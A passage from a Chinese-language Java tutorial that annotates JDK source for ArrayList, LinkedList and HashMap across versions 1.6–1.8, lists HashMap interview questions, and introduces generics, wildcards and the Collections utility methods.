//需要移动的元素个数 int numMoved = size - index - 1; //如果需要移动元素，就用System.arraycopy移动元素 if (numMoved &gt; 0) System.arraycopy(elementData, index+1, elementData, index, numMoved); //将elementData[size-1]位置置空，让GC回收空间，元素个数减少 elementData[--size] = null; // clear to let GC do its work return oldValue; &#125; 1234567891011121314public E set(int index, E element) &#123; rangeCheck(index);//检验index是否合法 //取出[index]位置的元素，[index]位置的元素就是要被替换的元素，用于最后返回被替换的元素 E oldValue = elementData(index); //用element替换[index]位置的元素 elementData[index] = element; return oldValue;&#125;public E get(int index) &#123; rangeCheck(index);//检验index是否合法 return elementData(index);//返回[index]位置的元素&#125; 12345678910111213141516171819202122232425262728public int indexOf(Object o) &#123; //分为o是否为空两种情况 if (o == null) &#123; //从前往后找 for (int i = 0; i &lt; size; i++) if (elementData[i]==null) return i; &#125; else &#123; for (int i = 0; i &lt; size; i++) if (o.equals(elementData[i])) return i; &#125; return -1;&#125;public int lastIndexOf(Object o) &#123; //分为o是否为空两种情况 if (o == null) &#123; //从后往前找 for (int i = size-1; i &gt;= 0; i--) if (elementData[i]==null) return i; &#125; else &#123; for (int i = size-1; i &gt;= 0; i--) if (o.equals(elementData[i])) return i; &#125; return -1;&#125; （3）LinkedList源码分析123456789101112131415int size = 0;Node&lt;E&gt; first;//记录第一个结点的位置Node&lt;E&gt; last;//记录最后一个结点的位置 private static class Node&lt;E&gt; &#123; E item;//元素数据 Node&lt;E&gt; next;//下一个结点 Node&lt;E&gt; prev;//前一个结点 Node(Node&lt;E&gt; prev, E element, Node&lt;E&gt; next) &#123; this.item = element; this.next = next; this.prev = prev; &#125; &#125; 123456789101112131415161718192021222324public boolean add(E e) &#123; linkLast(e);//默认把新元素链接到链表尾部 return true;&#125;void linkLast(E e) &#123; final Node&lt;E&gt; l = last;//用l 记录原来的最后一个结点 //创建新结点 final Node&lt;E&gt; newNode = new Node&lt;&gt;(l, e, null); //现在的新结点是最后一个结点了 last = newNode; //如果l==null，说明原来的链表是空的 if (l == null) //那么新结点同时也是第一个结点 first = newNode; else //否则把新结点链接到原来的最后一个结点的next中 l.next = newNode; //元素个数增加 size++; //修改次数增加 modCount++;&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657 public boolean remove(Object o) &#123; //分o是否为空两种情况 if (o == null) &#123; //找到o对应的结点x for (Node&lt;E&gt; x = first; x != null; x = x.next) &#123; if (x.item == null) &#123; unlink(x);//删除x结点 return true; &#125; &#125; &#125; else &#123; //找到o对应的结点x for (Node&lt;E&gt; x = first; x != null; x = x.next) &#123; if (o.equals(x.item)) &#123; unlink(x);//删除x结点 return true; &#125; &#125; &#125; return false; &#125; E unlink(Node&lt;E&gt; x) &#123;//x是要被删除的结点 // assert x != null; final E element = x.item;//被删除结点的数据 final Node&lt;E&gt; next = x.next;//被删除结点的下一个结点 final Node&lt;E&gt; prev = x.prev;//被删除结点的上一个结点 //如果被删除结点的前面没有结点，说明被删除结点是第一个结点 if (prev == null) &#123; //那么被删除结点的下一个结点变为第一个结点 first = next; &#125; else &#123;//被删除结点不是第一个结点 //被删除结点的上一个结点的next指向被删除结点的下一个结点 prev.next = next; //断开被删除结点与上一个结点的链接 x.prev = null;//使得GC回收 &#125; //如果被删除结点的后面没有结点，说明被删除结点是最后一个结点 if (next == null) &#123; //那么被删除结点的上一个结点变为最后一个结点 last = prev; &#125; else &#123;//被删除结点不是最后一个结点 //被删除结点的下一个结点的prev执行被删除结点的上一个结点 next.prev = prev; //断开被删除结点与下一个结点的连接 x.next = null;//使得GC回收 &#125;//把被删除结点的数据也置空，使得GC回收 x.item = null; //元素个数减少 size--; //修改次数增加 modCount++; //返回被删除结点的数据 return element; &#125; 12.5 Set12.5.1 Set概述Set系列的集合：不可重复的 Set系列的集合，有有序的也有无序的。HashSet无序的，TreeSet按照元素的大小顺序遍历，LinkedHashSet按照元素的添加顺序遍历。 12.5.2 实现类的特点（1）HashSet： ​ 底层是HashMap实现。添加到HashSet的元素是作为HashMap的key，value是一个Object类型的常量对象PRESENT。 ​ 依赖于元素的hashCode()和equals()保证元素的不可重复，存储位置和hashCode()值有关，根据hashCode()来算出它在底层table数组中的[index] （2）TreeSet ​ 底层是TreeMap实现。添加到TreeSet的元素是作为TreeMap的key，value是一个Object类型的常量对象PRESENT。 ​ 依赖于元素的大小，要么是java.lang.Comparable接口compareTo(Object obj)，要么是java.util.Comparator接口的compare(Object o1, Object o2)来比较元素的大小。认为大小相等的两个元素就是重复元素。 （3）LinkedHashSet ​ 底层是LinkedHashMap。添加到LinkedHashSet的元素是作为LinkedHashMap的key，value是一个Object类型的常量对象PRESENT。 ​ LinkedHashSet是HashSet的子类，比父类多维护了元素的添加顺序。 ​ 当且仅当，你既想要元素不可重复，又要保证元素的添加顺序时，再使用它。 ​ 12.6 Map12.6.1 Map概述用来存储键值对，映射关系的集合。所有的Map的key都不能重复。 键值对、映射关系的类型：Entry类型 1234Entry接口是Map接口的内部接口。所有的Map的键值对的类型都实现了这个接口。HashMap中的映射关系，是有一个内部类来实现Entry的接口，JDK1.7是一个叫做Entry的内部类实现Entry接口。JDK1.8是一个叫做Node的内部类实现Entry接口。TreeMap中的映射关系，是有一个内部类Entry来实现Entry的接口 12.6.2 API（1）put(Object key, Object value)：添加一对映射关系 （2）putAll(Map m)：添加多对映射关系 （3）clear()：清空map （4）remove(Object key)：根据key删除一对 （5）int size()：获取有效元素的对数 （6）containsKey(Object key)：是否包含某个key （7）containsValue(Object value)：是否包含某个value （8）Object get(Object key)：根据key获取value （9）遍历相关的几个方法 Collection values()：获取所有的value进行遍历 Set keySet()：获取所有key进行遍历 Set entrySet()：获取所有映射关系进行遍历 12.6.3 Map的实现类们的区别（1）HashMap： ​ 依据key的hashCode()和equals()来保证key是否重复。 ​ key如果重复，新的value会替换旧的value。 ​ hashCode()决定了映射关系在table数组中的存储的位置，index = hash(key.hashCode()) &amp; table.length-1 ​ HashMap的底层实现：JDK1.7是数组+链表；JDK1.8是数组+链表/红黑树 （2）TreeMap ​ 依据key的大小来保证key是否重复。key如果重复，新的value会替换旧的value。 ​ key的大小依赖于，java.lang.Comparable或java.util.Comparator。 （3）LinkedHashMap ​ 依据key的hashCode()和equals()来保证key是否重复。key如果重复，新的value会替换旧的value。 ​ LinkedHashMap是HashMap的子类，比HashMap多了添加顺序 12.6.4 HashMap源码分析JDK1.6源码：12345678910111213public HashMap() &#123; //this.loadFactor加载因子，影响扩容的频率 //DEFAULT_LOAD_FACTOR：默认加载因子0.75 this.loadFactor = DEFAULT_LOAD_FACTOR; //threshold阈值 = 容量 * 加载因子 //threshold阈值，当size达到threhold时，考虑扩容 //扩容需要两个条件同时满足：（1）size &gt;= threhold （2）table[index]！=null，即新映射关系要存入的位置非空 threshold = (int)(DEFAULT_INITIAL_CAPACITY * DEFAULT_LOAD_FACTOR); //table是数组， //DEFAULT_INITIAL_CAPACITY：默认是16 table = new Entry[DEFAULT_INITIAL_CAPACITY]; init();&#125; JDK1.7源码：12345678910111213141516171819202122 public HashMap() &#123; //DEFAULT_INITIAL_CAPACITY：默认初始容量16 //DEFAULT_LOAD_FACTOR：默认加载因子0.75 this(DEFAULT_INITIAL_CAPACITY, DEFAULT_LOAD_FACTOR); &#125; public HashMap(int initialCapacity, float loadFactor) &#123; //校验initialCapacity合法性 if (initialCapacity &lt; 0) throw new IllegalArgumentException(\"Illegal initial capacity: \" + //校验initialCapacity合法性 initialCapacity); if (initialCapacity &gt; MAXIMUM_CAPACITY) initialCapacity = MAXIMUM_CAPACITY; //校验loadFactor合法性 if (loadFactor &lt;= 0 || Float.isNaN(loadFactor)) throw new IllegalArgumentException(\"Illegal load factor: \" + loadFactor);//加载因子，初始化为0.75 this.loadFactor = loadFactor; // threshold 初始为初始容量 threshold = initialCapacity; init(); &#125; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677public V put(K key, V value) &#123; //如果table数组是空的，那么先创建数组 if (table == EMPTY_TABLE) &#123; //threshold一开始是初始容量的值 inflateTable(threshold); &#125; //如果key是null，单独处理 if (key == null) return putForNullKey(value); //对key的hashCode进行干扰，算出一个hash值 int hash = hash(key); //计算新的映射关系应该存到table[i]位置， //i = hash &amp; table.length-1，可以保证i在[0,table.length-1]范围内 int i = indexFor(hash, table.length); //检查table[i]下面有没有key与我新的映射关系的key重复，如果重复替换value for (Entry&lt;K,V&gt; e = table[i]; e != null; e = e.next) &#123; Object k; if (e.hash == hash &amp;&amp; ((k = e.key) == key || key.equals(k))) &#123; V oldValue = e.value; e.value = value; e.recordAccess(this); return oldValue; &#125; &#125; modCount++; //添加新的映射关系 addEntry(hash, key, value, i); return null; &#125; private void inflateTable(int toSize) &#123; // Find a power of 2 &gt;= toSize int capacity = roundUpToPowerOf2(toSize);//容量是等于toSize值的最接近的2的n次方 //计算阈值 = 容量 * 加载因子 threshold = (int) Math.min(capacity * loadFactor, MAXIMUM_CAPACITY + 1); //创建Entry[]数组，长度为capacity table = new Entry[capacity]; initHashSeedAsNeeded(capacity); &#125; //如果key是null，直接存入[0]的位置 private V putForNullKey(V value) &#123; //判断是否有重复的key，如果有重复的，就替换value for (Entry&lt;K,V&gt; e = table[0]; e != null; e = e.next) &#123; if (e.key == null) &#123; V oldValue = e.value; e.value = value; e.recordAccess(this); return oldValue; &#125; &#125; modCount++; //把新的映射关系存入[0]的位置，而且key的hash值用0表示 addEntry(0, null, value, 0); return null; &#125; void addEntry(int hash, K key, V value, int bucketIndex) &#123; //判断是否需要库容 //扩容：（1）size达到阈值（2）table[i]正好非空 if ((size &gt;= threshold) &amp;&amp; (null != table[bucketIndex])) &#123; //table扩容为原来的2倍，并且扩容后，会重新调整所有映射关系的存储位置 resize(2 * table.length); //新的映射关系的hash和index也会重新计算 hash = (null != key) ? hash(key) : 0; bucketIndex = indexFor(hash, table.length); &#125; //存入table中 createEntry(hash, key, value, bucketIndex); &#125; void createEntry(int hash, K key, V value, int bucketIndex) &#123; Entry&lt;K,V&gt; e = table[bucketIndex]; //原来table[i]下面的映射关系作为新的映射关系next table[bucketIndex] = new Entry&lt;&gt;(hash, key, value, e); size++;//个数增加 &#125; 1、put(key,value) （1）当第一次添加映射关系时，数组初始化为一个长度为16的HashMap$Entry的数组，这个HashMap$Entry类型是实现了java.util.Map.Entry接口 （2）特殊考虑：如果key为null，index直接是[0] （3）在计算index之前，会对key的hashCode()值，做一个hash(key)再次哈希的运算，这样可以使得Entry对象更加散列的存储到table中 （4）计算index = table.length-1 &amp; hash; （5）如果table[index]下面，已经有映射关系的key与我要添加的新的映射关系的key相同了，会用新的value替换旧的value。 （6）如果没有相同的，会把新的映射关系添加到链表的头，原来table[index]下面的Entry对象连接到新的映射关系的next中。 （7）添加之前先判断if(size &gt;= threshold &amp;&amp; table[index]!=null)如果该条件为true，会扩容 ​ if(size &gt;= threshold &amp;&amp; table[index]!=null){ ​ ①会扩容 ​ ②会重新计算key的hash ​ ③会重新计算index ​ } 2、get(key) （1）计算key的hash值，用这个方法hash(key) （2）找index = table.length-1 &amp; hash; （3）如果table[index]不为空，那么就挨个比较哪个Entry的key与它相同，就返回它的value 3、remove(key) （1）计算key的hash值，用这个方法hash(key) （2）找index = table.length-1 &amp; hash; （3）如果table[index]不为空，那么就挨个比较哪个Entry的key与它相同，就删除它，把它前面的Entry的next的值修改为被删除Entry的next JDK1.8源码12345678910111213几个常量和变量：（1）DEFAULT_INITIAL_CAPACITY：默认的初始容量 16（2）MAXIMUM_CAPACITY：最大容量 1 &lt;&lt; 30（3）DEFAULT_LOAD_FACTOR：默认加载因子 0.75（4）TREEIFY_THRESHOLD：默认树化阈值8，当链表的长度达到这个值后，要考虑树化（5）UNTREEIFY_THRESHOLD：默认反树化阈值6，当树中的结点的个数达到这个阈值后，要考虑变为链表（6）MIN_TREEIFY_CAPACITY：最小树化容量64 当单个的链表的结点个数达到8，并且table的长度达到64，才会树化。 当单个的链表的结点个数达到8，但是table的长度未达到64，会先扩容（7）Node&lt;K,V&gt;[] table：数组（8）size：记录有效映射关系的对数，也是Entry对象的个数（9）int threshold：阈值，当size达到阈值时，考虑扩容（10）double loadFactor：加载因子，影响扩容的频率 1234public HashMap() &#123; this.loadFactor = DEFAULT_LOAD_FACTOR; // all other fields defaulted，其他字段都是默认值&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225 public V put(K key, V value) &#123; return putVal(hash(key), key, value, false, true); &#125;//目的：干扰hashCode值 static final int hash(Object key) &#123; int h; //如果key是null，hash是0 //如果key非null，用key的hashCode值 与 key的hashCode值高16进行异或 // 即就是用key的hashCode值高16位与低16位进行了异或的干扰运算 /* index = hash &amp; table.length-1 如果用key的原始的hashCode值 与 table.length-1 进行按位与，那么基本上高16没机会用上。 这样就会增加冲突的概率，为了降低冲突的概率，把高16位加入到hash信息中。 */ return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16); &#125; final V putVal(int hash, K key, V value, boolean onlyIfAbsent, boolean evict) &#123; Node&lt;K,V&gt;[] tab; //数组 Node&lt;K,V&gt; p; //一个结点 int n, i;//n是数组的长度 i是下标 //tab和table等价 //如果table是空的 if ((tab = table) == null || (n = tab.length) == 0)&#123; n = (tab = resize()).length; /* tab = resize(); n = tab.length;*/ /* 如果table是空的，resize()完成了①创建了一个长度为16的数组②threshold = 12 n = 16 */ &#125; //i = (n - 1) &amp; hash ，下标 = 数组长度-1 &amp; hash //p = tab[i] 第1个结点 //if(p==null) 条件满足的话说明 table[i]还没有元素 if ((p = tab[i = (n - 1) &amp; hash]) == null)&#123; //把新的映射关系直接放入table[i] tab[i] = newNode(hash, key, value, null); //newNode（）方法就创建了一个Node类型的新结点，新结点的next是null &#125;else &#123; Node&lt;K,V&gt; e; K k; //p是table[i]中第一个结点 //if(table[i]的第一个结点与新的映射关系的key重复) if (p.hash == hash &amp;&amp; ((k = p.key) == key || (key != null &amp;&amp; key.equals(k))))&#123; e = p;//用e记录这个table[i]的第一个结点 &#125;else if (p instanceof TreeNode)&#123;//如果table[i]第一个结点是一个树结点 //单独处理树结点 //如果树结点中，有key重复的，就返回那个重复的结点用e接收，即e!=null //如果树结点中，没有key重复的，就把新结点放到树中，并且返回null，即e=null e = ((TreeNode&lt;K,V&gt;)p).putTreeVal(this, tab, hash, key, value); &#125;else &#123; //table[i]的第一个结点不是树结点，也与新的映射关系的key不重复 //binCount记录了table[i]下面的结点的个数 for (int binCount = 0; ; ++binCount) &#123; //如果p的下一个结点是空的，说明当前的p是最后一个结点 if ((e = p.next) == null) &#123; //把新的结点连接到table[i]的最后 p.next = newNode(hash, key, value, null); //如果binCount&gt;=8-1，达到7个时 if (binCount &gt;= TREEIFY_THRESHOLD - 1)&#123; // -1 for 1st //要么扩容，要么树化 treeifyBin(tab, hash); &#125; break; &#125; //如果key重复了，就跳出for循环，此时e结点记录的就是那个key重复的结点 if (e.hash == hash &amp;&amp;((k = e.key) == key || (key != null &amp;&amp; key.equals(k))))&#123; break; &#125; p = e;//下一次循环，e=p.next，就类似于e=e.next，往链表下移动 &#125; &#125; //如果这个e不是null，说明有key重复，就考虑替换原来的value if (e != null) &#123; // existing mapping for key V oldValue = e.value; if (!onlyIfAbsent || oldValue == null)&#123; e.value = value; &#125; afterNodeAccess(e);//什么也没干 return oldValue; &#125; &#125; ++modCount; //元素个数增加 //size达到阈值 if (++size &gt; threshold)&#123; resize();//一旦扩容，重新调整所有映射关系的位置 &#125; afterNodeInsertion(evict);//什么也没干 return null; &#125; final Node&lt;K,V&gt;[] resize() &#123; Node&lt;K,V&gt;[] oldTab = table;//oldTab原来的table //oldCap：原来数组的长度 int oldCap = (oldTab == null) ? 0 : oldTab.length; //oldThr：原来的阈值 int oldThr = threshold;//最开始threshold是0 //newCap，新容量 //newThr：新阈值 int newCap, newThr = 0; if (oldCap &gt; 0) &#123;//说明原来不是空数组 if (oldCap &gt;= MAXIMUM_CAPACITY) &#123;//是否达到数组最大限制 threshold = Integer.MAX_VALUE; return oldTab; &#125;else if ((newCap = oldCap &lt;&lt; 1) &lt; MAXIMUM_CAPACITY &amp;&amp; oldCap &gt;= DEFAULT_INITIAL_CAPACITY)&#123; //newCap = 旧的容量*2 ，新容量&lt;最大数组容量限制 //新容量：32,64，... //oldCap &gt;= 初始容量16 //新阈值重新算 = 24，48 .... newThr = oldThr &lt;&lt; 1; // double threshold &#125; &#125;else if (oldThr &gt; 0)&#123; // initial capacity was placed in threshold newCap = oldThr; &#125;else &#123; // zero initial threshold signifies using defaults newCap = DEFAULT_INITIAL_CAPACITY;//新容量是默认初始化容量16 //新阈值= 默认的加载因子 * 默认的初始化容量 = 0.75*16 = 12 newThr = (int)(DEFAULT_LOAD_FACTOR * DEFAULT_INITIAL_CAPACITY); &#125; if (newThr == 0) &#123; float ft = (float)newCap * loadFactor; newThr = (newCap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; (float)MAXIMUM_CAPACITY ? (int)ft : Integer.MAX_VALUE); &#125; threshold = newThr;//阈值赋值为新阈值12，24.。。。 //创建了一个新数组，长度为newCap，16，32,64.。。 @SuppressWarnings(&#123;\"rawtypes\",\"unchecked\"&#125;) Node&lt;K,V&gt;[] newTab = (Node&lt;K,V&gt;[])new Node[newCap]; table = newTab; if (oldTab != null) &#123;//原来不是空数组 //把原来的table中映射关系，倒腾到新的table中 for (int j = 0; j &lt; oldCap; ++j) &#123; Node&lt;K,V&gt; e; if ((e = oldTab[j]) != null) &#123;//e是table下面的结点 oldTab[j] = null;//把旧的table[j]位置清空 if (e.next == null)//如果是最后一个结点 newTab[e.hash &amp; (newCap - 1)] = e;//重新计算e的在新table中的存储位置，然后放入 else if (e instanceof TreeNode)//如果e是树结点 //把原来的树拆解，放到新的table ((TreeNode&lt;K,V&gt;)e).split(this, newTab, j, oldCap); else &#123; // preserve order Node&lt;K,V&gt; loHead = null, loTail = null; Node&lt;K,V&gt; hiHead = null, hiTail = null; Node&lt;K,V&gt; next; /* 把原来table[i]下面的整个链表，重新挪到了新的table中 */ do &#123; next = e.next; if ((e.hash &amp; oldCap) == 0) &#123; if (loTail == null) loHead = e; else loTail.next = e; loTail = e; &#125; else &#123; if (hiTail == null) hiHead = e; else hiTail.next = e; hiTail = e; &#125; &#125; while ((e = next) != null); if (loTail != null) &#123; loTail.next = null; newTab[j] = loHead; &#125; if (hiTail != null) &#123; hiTail.next = null; newTab[j + oldCap] = hiHead; &#125; &#125; &#125; &#125; &#125; return newTab; &#125; Node&lt;K,V&gt; newNode(int hash, K key, V value, Node&lt;K,V&gt; next) &#123; //创建一个新结点 return new Node&lt;&gt;(hash, key, value, next); &#125; final void treeifyBin(Node&lt;K,V&gt;[] tab, int hash) &#123; int n, index; Node&lt;K,V&gt; e; //MIN_TREEIFY_CAPACITY：最小树化容量64 //如果table是空的，或者 table的长度没有达到64 if (tab == null || (n = tab.length) &lt; MIN_TREEIFY_CAPACITY) resize();//先扩容 else if ((e = tab[index = (n - 1) &amp; hash]) != null) &#123; //用e记录table[index]的结点的地址 TreeNode&lt;K,V&gt; hd = null, tl = null; /* do...while，把table[index]链表的Node结点变为TreeNode类型的结点 */ do &#123; TreeNode&lt;K,V&gt; p = replacementTreeNode(e, null); if (tl == null) hd = p;//hd记录根结点 else &#123; p.prev = tl; tl.next = p; &#125; tl = p; &#125; while ((e = e.next) != null); //如果table[index]下面不是空 if ((tab[index] = hd) != null) hd.treeify(tab);//将table[index]下面的链表进行树化 &#125; &#125; 1、添加过程 （1）当第一次添加映射关系时，数组初始化为一个长度为16的HashMap$Node的数组，这个HashMap$Node类型是实现了java.util.Map.Entry接口 （2）在计算index之前，会对key的hashCode()值，做一个hash(key)再次哈希的运算，这样可以使得Entry对象更加散列的存储到table中 JDK1.8关于hash(key)方法的实现比JDK1.7要简洁。 key.hashCode() ^ key.Code()&gt;&gt;&gt;16; （3）计算index = table.length-1 &amp; hash; （4）如果table[index]下面，已经有映射关系的key与我要添加的新的映射关系的key相同了，会用新的value替换旧的value。 （5）如果没有相同的， ①table[index]链表的长度没有达到8个，会把新的映射关系添加到链表的尾 ②table[index]链表的长度达到8个，但是table.length没有达到64，会先对table进行扩容，然后再添加 ③table[index]链表的长度达到8个，并且table.length达到64，会先把该分支进行树化，结点的类型变为TreeNode，然后把链表转为一棵红黑树 ④table[index]本来就已经是红黑树了，那么直接连接到树中，可能还会考虑考虑左旋右旋以保证树的平衡问题 （6）添加完成后判断if(size &gt; threshold ){ ​ ①会扩容 ​ ②会重新计算key的hash ​ ③会重新计算index ​ } 2、remove(key) （1）计算key的hash值，用这个方法hash(key) （2）找index = table.length-1 &amp; hash; （3）如果table[index]不为空，那么就挨个比较哪个Entry的key与它相同，就删除它，把它前面的Entry的next的值修改为被删除Entry的next （4）如果table[index]下面原来是红黑树，结点删除后，个数小于等于6，会把红黑树变为链表 12.6.5 关于HashMap的面试问题1、HashMap的底层实现 答：JDK1.7是数组+链表，JDK1.8是数组+链表/红黑树 2、HashMap的数组的元素类型 答：java.util.Map$Entry接口类型。 JDK1.7的HashMap中有内部类Entry实现Entry接口 JDK1.8的HashMap中有内部类Node和TreeNode类型实现Entry接口 3、为什么要使用数组？ 答：因为数组的访问的效率高 4、为什么数组还需要链表？或问如何解决hash或[index]冲突问题？ 答：为了解决hash和[index]冲突问题 （1）两个不相同的key的hashCode值本身可能相同 （2）两个hashCode不相同的key，通过hash(key)以及 hash &amp; table.length-1运算得到的[index]可能相同 那么意味着table[index]下可能需要存储多个Entry的映射关系对象，所以需要链表 5、HashMap的数组的初始化长度 答：默认的初始容量值是16 6、HashMap的映射关系的存储索引index如何计算 答：hash &amp; table.length-1 7、为什么要使用hashCode()? 空间换时间 答：因为hashCode()是一个整数值，可以用来直接计算index，效率比较高，用数组这种结构虽然会浪费一些空间，但是可以提高查询效率。 8、hash()函数的作用是什么 答：在计算index之前，会对key的hashCode()值，做一个hash(key)再次哈希的运算，这样可以使得Entry对象更加散列的存储到table中 JDK1.8关于hash(key)方法的实现比JDK1.7要简洁。 key.hashCode() ^ key.Code()&gt;&gt;&gt;16; 因为这样可以使得hashCode的高16位信息也能参与到运算中来 9、HashMap的数组长度为什么一定要是2的幂次方 答：因为2的n次方-1的二进制值是前面都0，后面几位都是1，这样的话，与hash进行&amp;运算的结果就能保证在[0,table.length-1]范围内，而且是均匀的。 10、HashMap 为什么使用 &amp;按位与运算代替%模运算？ 答：因为&amp;效率高 11、HashMap的数组什么时候扩容？ 答：JDK1.7版：当要添加新Entry对象时发现（1）size达到threshold（2）table[index]!=null时，两个条件同时满足会扩容 JDK1.8版：当要添加新Entry对象时发现（1）size达到threshold（2）当table[index]下的结点个数达到8个但是table.length又没有达到64。两种情况满足其一都会导致数组扩容 而且数组一旦扩容，不管哪个版本，都会导致所有映射关系重新调整存储位置。 12、如何计算扩容阈值(临界值)？ 答：threshold = capacity * loadfactor 13、loadFactor为什么是0.75，如果是1或者0.1呢有什么不同？ 答：1的话，会导致某个table[index]下面的结点个数可能很长 0.1的话，会导致数组扩容的频率太高 14、JDK1.8的HashMap什么时候树化？ 答：当table[index]下的结点个数达到8个但是table.length已经达到64 15、JDK1.8的HashMap什么时候反树化？ 答：当table[index]下的树结点个数少于6个 16、JDK1.8的HashMap为什么要树化？ 答：因为当table[index]下的结点个数超过8个后，查询效率就低下了，修改为红黑树的话，可以提高查询效率 17、JDK1.8的HashMap为什么要反树化？ 答：因为因为当table[index]下树的结点个数少于6个后，使用红黑树反而过于复杂了，此时使用链表既简洁又效率也不错 18、作为HashMap的key类型重写equals和hashCode方法有什么要求 ​ （1）equals与hashCode一起重写 ​ （2）重写equals()方法，但是有一些注意事项； 自反性：x.equals(x)必须返回true。对称性：x.equals(y)与y.equals(x)的返回值必须相等。传递性：x.equals(y)为true，y.equals(z)也为true，那么x.equals(z)必须为true。一致性：如果对象x和y在equals()中使用的信息都没有改变，那么x.equals(y)值始终不变。非null：x不是null，y为null，则x.equals(y)必须为false。 ​ （3）重写hashCode（）的注意事项 如果equals返回true的两个对象，那么hashCode值一定相同，并且只要参与equals判断属性没有修改，hashCode值也不能修改；如果equals返回false的两个对象，那么hashCode值可以相同也可以不同；如果hashCode值不同的，equals一定要返回false；hashCode不宜过简单，太简单会导致冲突严重，hashCode也不宜过于复杂，会导致性能低下； 19、为什么大部分 hashcode 方法使用 31？ 答：因为31是一个不大不小的素数 20、请问已经存储到HashMap中的key的对象属性是否可以修改？为什么？ 答：如果该属性参与hashCode的计算，那么不要修改。因为一旦修改hashCode()已经不是原来的值。而存储到HashMap中时，key的hashCode()–&gt;hash()–&gt;hash已经确定了，不会重新计算。用新的hashCode值再查询get(key)/删除remove(key)时，算的hash值与原来不一样就不找不到原来的映射关系了。 21、所以为什么，我们实际开发中，key的类型一般用String和Integer 答：因为他们不可变。 22、为什么HashMap中的Node或Entry类型的hash变量与key变量加final声明？ 答：因为不希望你修改hash和key值 23、为什么HashMap中的Node或Entry类型要单独存储hash？ 答：为了在添加、删除、查找过程中，比较hash效率更高，不用每次重新计算key的hash值 24、请问已经存储到HashMap中的value的对象属性是否可以修改？为什么？ 答：可以。因为我们存储、删除等都是根据key，和value无关。 25、如果key是null是如何存储的？ 答：会存在table[0]中 12.7 集合框架图 1560348912361 第13章 泛型13.1 泛型的概述泛型：参数化类型 类型形参：，，，，，。。。。 类型实参：必须是引用数据类型，不能是基本数据类型 ​ ，，，&lt;ArrayList&gt;。。。 13.2 形式一：泛型类与泛型接口1、声明语法格式： 12345678910【修饰符】 class 类名/接口&lt;类型形参列表&gt;&#123; &#125;【修饰符】 class 类名/接口&lt;类型形参1 extends 父类上限&gt;&#123; &#125;【修饰符】 class 类名/接口&lt;类型形参1 extends 父类上限 &amp; 父接口上限&gt;&#123; &#125; 在类名或接口名后面声明的泛型形参类型，可以在当前类或接口中使用，用作声明成员变量、方法的形参、方法的返回值。 但是不能用于静态成员上 2、使用语法格式 在（1）创建泛型类、泛型接口的对象时，为泛型形参指定具体类型 ​ （2）在继承泛型类或实现泛型接口时，为泛型形参指定具体类型 示例代码 12345678910111213141516171819ArrayList&lt;String&gt; list = new ArrayList&lt;String&gt;();ArrayList&lt;String&gt; list = new ArrayList&lt;&gt;();//JDK1.7之后可以省略class MyStringArrayList extends ArrayList&lt;String&gt;&#123; &#125;class Employee implements Comparable&lt;Employee&gt;&#123; public int compareTo(Employee e)&#123; &#125;&#125;Arrays.sort(数组, new Comparator&lt;泛型实参&gt;()&#123; public int compare(泛型实参类型 o1, 泛型实参类型 o2)&#123; &#125;&#125;); 3、泛型如果没有指定，会被擦除，按照最左边的上限处理，如果没有指定上限，按照Object处理 13.3 形式二：泛型方法1、声明的语法格式 12【修饰符】 &lt;泛型形参列表&gt; 返回值类型 方法名(【数据形参列表】)【throws 异常列表】&#123;&#125;【修饰符】 &lt;泛型形参 extends 父类上限 &amp; 父接口上限&gt; 返回值类型 方法名(【数据形参列表】)【throws 异常列表】&#123;&#125; （1）在方法返回值类型前面声明的泛型形参类型，只能在当前方法中使用，用于表示形参的类型或返回值类型，或方法局部变量的类型，和别的方法无关。 （2）泛型方法可以是静态方法，也可以是非静态方法 2、 使用 当调用方法，会根据具体的数据的实参的类型，来确定泛型实参的类型。 13.4 通配符？（1）?：代表任意引用数据类型 （2）? extends 上限：代表上限本身或它的子类 （3）? super 下限：代表下限本身或它的父类 例如： ArrayList&lt;?&gt;：表示可以接受任意类型 123ArrayList&lt;?&gt; list = new ArrayList&lt;String&gt;();ArrayList&lt;?&gt; list = new ArrayList&lt;Integer&gt;();ArrayList&lt;?&gt; list = new ArrayList&lt;Animal&gt;(); ArrayList&lt;? extends 上限&gt;： 1234ArrayList&lt;? extends Person&gt; list = new ArrayList&lt;Person&gt;();ArrayList&lt;? extends Person&gt; list = new ArrayList&lt;Animal&gt;();//Animal不行，因为Animal是父类ArrayList&lt;? extends Person&gt; list = new ArrayList&lt;Student&gt;();ArrayList&lt;? extends Person&gt; list = new ArrayList&lt;Dog&gt;();//Dog也不行 ArrayList&lt;? super 下限&gt;： 1234ArrayList&lt;? super Person&gt; list = new ArrayList&lt;Person&gt;();ArrayList&lt;? super Person&gt; list = new ArrayList&lt;Animal&gt;();ArrayList&lt;? super Person&gt; list = new ArrayList&lt;Student&gt;();//Student，因为Student是子类ArrayList&lt;? super Person&gt; list = new ArrayList&lt;Dog&gt;();//Dog也不行 ArrayList&lt;?&gt;：不能添加元素，除了null ArrayList&lt;? extends 上限&gt;：不能添加元素，除了null ArrayList&lt;? super 下限&gt;：可以添加下限或下限子类的对象 13.5 Collections工具类java.util.Collections：工具类，操作集合 （1）public static boolean addAll(Collection&lt;? super T&gt; c, T… elements) 添加elements的几个对象到c集合中。T是elements对象的类型，要求Collection集合的元素类型必须是T或T的父类 （2）public static int binarySearch(List&lt;? extends Comparable&lt;? super T&gt;&gt; list,T key) 在list集合中用二分查找key的下标，如果存在返回的是合理的下标，如果不存在返回的是一个负数下标 T是元素的类型， ，要求集合的元素必须实现Comparable接口 ，在实现Comparable接口，可以指定Comparable为T或T的父类。 （3）public static boolean disjoint(Collection c1, Collection&lt;?&gt; c2) 判断c1和c2没有交集就为true （4）public static &lt;T extends Object &amp; Comparable&lt;? super T&gt;&gt; T max(Collection&lt;? extends T&gt; coll) 求coll集合中最大元素 &lt;T extends Object &amp; Comparable&lt;? super T&gt;&gt;：要求T或T的父类实现Comparable接口 